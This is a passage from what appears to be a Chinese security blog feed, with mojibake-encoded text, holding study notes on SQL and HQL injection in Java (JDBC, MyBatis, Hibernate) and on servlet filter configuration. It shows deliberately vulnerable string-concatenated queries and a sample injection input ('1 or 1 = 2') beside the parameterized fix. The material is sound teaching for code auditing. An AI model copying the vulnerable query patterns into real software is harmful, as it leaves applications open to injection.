    <content type="html"><![CDATA[<h1 id="0x01-JDBC-æ‹¼æ¥ä¸å½“é€ æˆ-SQL-æ³¨å…¥"><a href="#0x01-JDBC-æ‹¼æ¥ä¸å½“é€ æˆ-SQL-æ³¨å…¥" class="headerlink" title="0x01 JDBC æ‹¼æ¥ä¸å½“é€ æˆ SQL æ³¨å…¥"></a>0x01 JDBC æ‹¼æ¥ä¸å½“é€ æˆ SQL æ³¨å…¥</h1><p>JDBC æœ‰ä¸¤ç§æ–¹æ³•æ‰§è¡Œ SQL è¯­å¥ï¼Œåˆ†åˆ«ä¸º PrepareStatement å’Œ Statementï¼Œä¸¤ä¸ªæ–¹æ³•çš„åŒºåˆ«åœ¨äº PrepareStatement ä¼šå¯¹ SQL è¯­å¥è¿›è¡Œé¢„ç¼–è¯‘ï¼Œè€Œ Statement åœ¨æ¯æ¬¡æ‰§è¡Œæ—¶éƒ½éœ€è¦ç¼–è¯‘ï¼Œä¼šå¢å¤§ç³»ç»Ÿå¼€é”€ã€‚</p><p>ç†è®ºä¸Š PrepareStatement çš„æ•ˆç‡å’Œå®‰å…¨æ€§ä¼šæ¯” Statement å¥½ï¼Œä½†ä¸æ„å‘³ç€å°±ä¸ä¼šå­˜åœ¨é—®é¢˜ã€‚</p><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨ Statement æ‰§è¡Œ SQL è¯­å¥çš„ç¤ºä¾‹</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user where id ="</span><span class="token operator">+</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Statement Demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"SQL: "</span><span class="token operator">+</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Statement</span> st <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> st<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œå¦‚æœè¾“å…¥çš„ id ä¸º 1 or 1 = 2ï¼Œé‚£ä¹ˆ SQL è¯­å¥å°±ä¼šè¢«æ‹¼æ¥ä¸º select * from user where id = 1 or 1 = 2ï¼Œæ”¹å˜äº†æƒ³è¦æŸ¥è¯¢ id = 1 çš„è¯­ä¹‰ã€‚ </p><p>PreqareStatement æ–¹æ³•æ”¯æŒä½¿ç”¨ ? å¯¹å˜é‡ä½è¿›è¡Œå ä½ï¼Œåœ¨é¢„ç¼–è¯‘é˜¶æ®µå¡«å…¥ç›¸åº”çš„å€¼ä¼šæ„é€ å‡ºå®Œæ•´çš„ SQL è¯­å¥ï¼Œä»è€Œé¿å… SQL æ³¨å…¥çš„äº§ç”Ÿã€‚</p><p>ä½†å¼€å‘æœ‰æ—¶ä¸ºäº†ä¾¿åˆ©ï¼Œä¼šç›´æ¥é‡‡å–æ‹¼æ¥çš„æ–¹å¼æ„é€  SQL è¯­å¥ï¼Œè¿™æ ·ä¸€æ¥ä¾ç„¶ä¼šå­˜åœ¨ SQL æ³¨å…¥ï¼Œå¦‚ä¸‹ä»£ç æ‰€ç¤ºã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user where id ="</span><span class="token operator">+</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"prepareStatement Demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"SQL: "</span><span class="token operator">+</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">PreparedStatement</span> pst <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> pst<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶å¦‚æœä½¿ç”¨ or 1 = 1 ä»ç„¶å¯ä»¥åˆ¤æ–­å­˜åœ¨ SQL æ³¨å…¥ï¼Œä½†æ˜¯å¦‚æœä½¿ç”¨ ? ä½œä¸ºå ä½ç¬¦ï¼Œå¡«å…¥çš„å­—æ®µçš„å€¼å°±ä¼šè¿›è¡Œä¸¥æ ¼çš„ç±»å‹æ£€æŸ¥ï¼Œå°±å¯ä»¥æœ‰æ•ˆçš„é¿å… SQL æ³¨å…¥çš„äº§ç”Ÿï¼Œå¦‚ä¸‹ä»£ç æ‰€ç¤ºã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"prepareStatement Demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user where id = ?"</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">PreparedStatement</span> pstt <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// å‚æ•°å·²ç»å¼ºåˆ¶è¦æ±‚æ˜¯æ•´å‹</span>    pstt<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> pstt<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>rs<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-æ¡†æ¶ä½¿ç”¨ä¸å½“é€ æˆ-SQL-æ³¨å…¥"><a href="#0x02-æ¡†æ¶ä½¿ç”¨ä¸å½“é€ æˆ-SQL-æ³¨å…¥" class="headerlink" title="0x02 æ¡†æ¶ä½¿ç”¨ä¸å½“é€ æˆ SQL æ³¨å…¥"></a>0x02 æ¡†æ¶ä½¿ç”¨ä¸å½“é€ æˆ SQL æ³¨å…¥</h1><p>é€šå¸¸æ¡†æ¶åº•å±‚å·²ç»å®ç°äº†å¯¹ SQL æ³¨å…¥çš„é˜²å¾¡ï¼Œä½†æ˜¯å¦‚æœåœ¨å¼€å‘æœªèƒ½æ°å½“çš„ä½¿ç”¨æ¡†æ¶çš„æƒ…å†µä¸‹ï¼Œä¾ç„¶ä¼šå­˜åœ¨ SQL æ³¨å…¥çš„é£é™©ã€‚</p><h2 id="1ã€MyBatis-æ¡†æ¶"><a href="#1ã€MyBatis-æ¡†æ¶" class="headerlink" title="1ã€MyBatis æ¡†æ¶"></a>1ã€MyBatis æ¡†æ¶</h2><p>MyBatis çš„æ€æƒ³æ˜¯å°† SQL è¯­å¥ç¼–å…¥é…ç½®æ–‡ä»¶ä¸­ï¼Œé¿å… SQL è¯­å¥åœ¨ä»£ç ä¸­å¤§é‡å‡ºç°ï¼Œæ–¹ä¾¿å¯¹ SQL è¯­å¥çš„ä¿®æ”¹å’Œé…ç½®ã€‚</p><p>MyBatis ä½¿ç”¨ parameterType å‘ SQL è¯­å¥ä¼ å‚ï¼Œåœ¨ SQL å¼•ç”¨ä¼ å‚çš„æ—¶å€™å¯ä»¥ä½¿ç”¨ #{} å’Œ ${} ä¸¤ç§æ–¹å¼ï¼Œä¸¤ç§æ–¹å¼åŒºåˆ«å¦‚ä¸‹ï¼š</p><p>${}ï¼šSQL æ‹¼æ¥ç¬¦å·ï¼Œç›´æ¥å°†è¾“å…¥çš„è¯­å¥æ‹¼æ¥åˆ° SQL è¯­å¥é‡Œï¼Œæƒ³é¿å… SQL æ³¨å…¥é—®é¢˜éœ€è¦æ‰‹åŠ¨æ·»åŠ è¿‡æ»¤</p><p>#{}ï¼šå ä½ç¬¦å·ï¼Œåœ¨å¯¹æ•°æ®è§£ææ—¶ä¼šè‡ªåŠ¨å°†è¾“å…¥çš„è¯­å¥å‰ååŠ ä¸Šå•å¼•å·ä»è€Œé¿å… SQL æ³¨å…¥</p><p>ä¹Ÿå°±æ˜¯è¯´åœ¨ MyBatis æ¡†æ¶ä¸­ï¼Œå¦‚æœä½¿ç”¨äº† ${} æ–¹æ³•ï¼ŒåŒæ—¶åˆæ²¡æœ‰è¿›è¡Œè¿‡æ»¤å°±ä¼šäº§ç”Ÿ SQL æ³¨å…¥ï¼Œè€Œä½¿ç”¨ #{} æ–¹æ³•æ—¶å¯ä»¥é¿å… SQL æ³¨å…¥ã€‚</p><h2 id="2ã€Hibernate-æ¡†æ¶"><a href="#2ã€Hibernate-æ¡†æ¶" class="headerlink" title="2ã€Hibernate æ¡†æ¶"></a>2ã€Hibernate æ¡†æ¶</h2><p>Hibernate æ˜¯ç°ä»Šä¸»æµçš„ Java æ•°æ®åº“æŒä¹…åŒ–æ¡†æ¶ï¼Œé‡‡ç”¨ Hibernate æŸ¥è¯¢è¯­å¥ï¼ˆHQLï¼‰æ³¨å…¥ã€‚</p><p>HQL æŸ¥è¯¢è¯­å¥æ¥è‡ª Hibernate å¼•æ“è¿›è¡Œè§£æï¼Œå› æ­¤äº§ç”Ÿçš„é”™è¯¯å¯èƒ½æ¥è‡ªæ•°æ®åº“ï¼Œä¹Ÿæœ‰å¯èƒ½æ¥è‡ª Hibernate å¼•æ“ã€‚ </p><p>HQL å’Œ SQL çš„åŒºåˆ«ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111172027760.png"></p><p>HQL æ³¨å…¥å’Œ SQL æ³¨å…¥çš„æˆå› éƒ½ä¸€æ ·ï¼Œä½¿ç”¨æ‹¼æ¥ HQL è¯­å¥çš„å†™æ³•å¯èƒ½ä¼šå¯¼è‡´ SQL æ³¨å…¥</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Query</span> query <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">createQuery</span><span class="token punctuation">(</span><span class="token string">"from User where name='"</span><span class="token operator">+</span>queryString<span class="token operator">+</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½†æ˜¯å—è¯­æ³•å½±å“ï¼ŒHQLæ³¨å…¥åœ¨æ¼æ´åˆ©ç”¨ä¸Šæœ‰ä¸€å®šçš„é™åˆ¶ï¼Œæ¯”å¦‚ä¸èƒ½åˆ©ç”¨è”åˆæŸ¥è¯¢ã€ä¸èƒ½è·¨åº“æŸ¥è¡¨ã€æ‰§è¡Œå‘½ä»¤ç­‰ã€‚</p><p>å¯¹äº Hibernate çš„æ³¨å…¥ï¼Œè¿™é‡Œåªä½œä¸ºç®€å•äº†è§£ä¸€ä¸‹ï¼Œå¹³æ—¶ä»£å®¡çš„æ—¶å€™æ³¨æ„ä¸€ä¸‹å³å¯ã€‚</p><blockquote><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://www.redhatzone.com/ask/article/1448.html">https://www.redhatzone.com/ask/article/1448.html</a></p><p><a href="https://www.redhatzone.com/ask/article/1448.html">https://blog.csdn.net/qq_36594628/article/details/119461996</a></p><p>æ›´å¤šä¿¡æ¯æ¬¢è¿å…³æ³¨æˆ‘çš„ä¸ªäººå¾®ä¿¡å…¬ä¼—å·ï¼šTeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-JDBC-æ‹¼æ¥ä¸å½“é€ æˆ-SQL-æ³¨å…¥&quot;&gt;&lt;a href=&quot;#0x01-JDBC-æ‹¼æ¥ä¸å½“é€ æˆ-SQL-æ³¨å…¥&quot; class=&quot;headerlink&quot; title=&quot;0x01 JDBC æ‹¼æ¥ä¸å½“é€ æˆ SQL æ³¨å…¥&quot;&gt;&lt;/a&gt;0x01 JDBC æ‹¼æ¥ä¸å½“é€ æˆ </summary>
      
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="å­¦ä¹ ç¬”è®°" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ã€ä»£ç å®¡è®¡ã€‘Java Web è¿‡æ»¤å™¨-filter</title>
    <link href="https://www.teamssix.com/211116-112510.html"/>
    <id>https://www.teamssix.com/211116-112510.html</id>
    <published>2021-11-16T03:25:10.000Z</published>
    <updated>2021-11-22T08:59:50.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>filter è¢«ç§°ä¸ºè¿‡æ»¤å™¨ï¼Œæ˜¯ Servlet 2.3 æ–°å¢çš„ä¸€ä¸ªç‰¹æ€§ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ Serlvet æŠ€æœ¯ä¸­æœ€å®ç”¨çš„æŠ€æœ¯ã€‚</p><p>è¿‡æ»¤å™¨å®é™…ä¸Šå°±æ˜¯å¯¹ Web èµ„æºè¿›è¡Œæ‹¦æˆªï¼Œåšä¸€äº›å¤„ç†åå†äº¤ç»™ä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨æˆ– Servlet å¤„ç†ï¼Œé€šå¸¸éƒ½æ˜¯ç”¨æ¥æ‹¦æˆª request è¿›è¡Œå¤„ç†çš„ï¼Œä¹Ÿå¯ä»¥å¯¹è¿”å›çš„ response è¿›è¡Œæ‹¦æˆªå¤„ç†ã€‚</p><p>å¼€å‘äººå‘˜åˆ©ç”¨ filter æŠ€æœ¯ï¼Œå¯ä»¥å®ç°å¯¹æ‰€æœ‰ Web èµ„æºçš„ç®¡ç†ï¼Œä¾‹å¦‚å®ç°æƒé™è®¿é—®æ§åˆ¶ã€è¿‡æ»¤æ•æ„Ÿè¯æ±‡ã€å‹ç¼©å“åº”ä¿¡æ¯ç­‰ä¸€äº›é«˜çº§åŠŸèƒ½ã€‚</p><h1 id="0x01-filter-çš„é…ç½®"><a href="#0x01-filter-çš„é…ç½®" class="headerlink" title="0x01 filter çš„é…ç½®"></a>0x01 filter çš„é…ç½®</h1><p>filter çš„é…ç½®ç±»ä¼¼äº Servletï¼Œç”± filter å’Œ filter-mapping ä¸¤ç»„æ ‡ç­¾ç»„æˆï¼Œå’Œ Servlet ä¸€æ ·ï¼Œå¦‚æœç‰ˆæœ¬å¤§äº 3.0 ä¹Ÿå¯ä»¥ä½¿ç”¨æ³¨è§£çš„æ–¹å¼æ¥é…ç½® filter</p><h2 id="1ã€åŸºäº-web-xml-çš„é…ç½®"><a href="#1ã€åŸºäº-web-xml-çš„é…ç½®" class="headerlink" title="1ã€åŸºäº web.xml çš„é…ç½®"></a>1ã€åŸºäº web.xml çš„é…ç½®</h2><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªåŸºäº web.xml çš„é…ç½®å†…å®¹</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/javaee<span class="token punctuation">"</span></span>           <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>           <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd<span class="token punctuation">"</span></span>           <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>manage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file-list</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">></span></span>index.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">></span></span>index.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file-list</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.sec.servlet.UserServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>com.sec.test.test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ ‡ç­¾å«ä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;filter&gt; æŒ‡å®šä¸€ä¸ªè¿‡æ»¤å™¨&lt;filter-name&gt; ä¸ºè¿‡æ»¤å™¨æŒ‡å®šä¸€ä¸ªåç§°ï¼Œè¯¥é¡¹ä¸èƒ½ä¸ºç©º&lt;filter-class&gt; ç”¨äºæŒ‡å®šè¿‡æ»¤å™¨çš„å®Œæ•´çš„é™å®šç±»å&lt;init-param&gt; ç”¨äºä¸ºè¿‡æ»¤å™¨æŒ‡å®šåˆå§‹åŒ–å‚æ•°  &lt;param-name&gt; ä¸º &lt;init-param&gt; çš„å­å‚æ•°ï¼Œç”¨äºæŒ‡å®šå‚æ•°çš„åç§°  &lt;param-value&gt; ä¸º &lt;init-param&gt; çš„å­å‚æ•°ï¼Œç”¨äºæŒ‡å®šå‚æ•°çš„å€¼&lt;filter-mapping&gt; ç”¨äºè®¾ç½®ä¸€ä¸ª filter è´Ÿè´£æ‹¦æˆªçš„èµ„æº  &lt;filer-name&gt; ä¸º &lt;filer-mapping&gt; çš„å­å‚æ•°ï¼Œç”¨äºè®¾ç½® filter çš„æ³¨å†Œåç§°ï¼Œè¯¥å€¼å¿…é¡»æ˜¯åœ¨ &lt;filter&gt; å…ƒç´ ä¸­å£°æ˜è¿‡çš„è¿‡æ»¤å™¨çš„åç§°  &lt;url-pattern&gt; ç”¨äºè®¾ç½® filter æ‰€æ‹¦æˆªçš„è¯·æ±‚è·¯å¾„&lt;servlet-name&gt; ç”¨äºæŒ‡å®šè¿‡æ»¤å™¨æ‰€æ‹¦æˆªçš„ Servlet åç§°<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2ã€åŸºäºæ³¨è§£çš„æ–¹æ³•"><a href="#2ã€åŸºäºæ³¨è§£çš„æ–¹æ³•" class="headerlink" title="2ã€åŸºäºæ³¨è§£çš„æ–¹æ³•"></a>2ã€åŸºäºæ³¨è§£çš„æ–¹æ³•</h2><p>ç¤ºä¾‹ä»£ç å¦‚ä¸‹</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebFilter</span><span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">"this is filter test"</span><span class="token punctuation">,</span>urlPatterns<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"/filterTest"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> filterTest <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*é”€æ¯æ—¶è°ƒç”¨*/</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> resp<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*è¿‡æ»¤æ–¹æ³• ä¸»è¦æ˜¯å¯¹requestå’Œresponseè¿›è¡Œä¸€äº›å¤„ç†ï¼Œç„¶åäº¤ç»™ä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨æˆ–Servletå¤„ç†*/</span>          chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//äº¤ç»™ä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨æˆ–servletå¤„ç†</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> config<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*åˆå§‹åŒ–æ–¹æ³•  æ¥æ”¶ä¸€ä¸ªFilterConfigç±»å‹çš„å‚æ•° è¯¥å‚æ•°æ˜¯å¯¹Filterçš„ä¸€äº›é…ç½®*/</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸ Servlet ä¸€æ ·ï¼Œä½¿ç”¨ web.xml å¯ä»¥é…ç½®çš„ filter å±æ€§ä¹Ÿéƒ½å¯ä»¥ä½¿ç”¨æ³¨è§£è¿›è¡Œé…ç½®ï¼Œä½†ä¸€èˆ¬ä¸æ¨èä½¿ç”¨æ³¨è§£é…ç½®ï¼Œå› ä¸ºä½¿ç”¨ web.xml å¯ä»¥æ§åˆ¶è¿‡æ»¤å™¨çš„æ‰§è¡Œé¡ºåºï¼Œè€Œä½¿ç”¨æ³¨è§£çš„æ–¹å¼åˆ™ä¸è¡Œã€‚</p><h1 id="0x02-filter-çš„æµç¨‹"><a href="#0x02-filter-çš„æµç¨‹" class="headerlink" title="0x02 filter çš„æµç¨‹"></a>0x02 filter çš„æµç¨‹</h1><p>filter çš„æµç¨‹å¾ˆç®€å•ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">ç”¨æˆ·å‘æœåŠ¡å™¨å‘é€è¯·æ±‚|æœåŠ¡å™¨|filter 1|......|filter n|service()æ–¹æ³•|filter n|......|filter 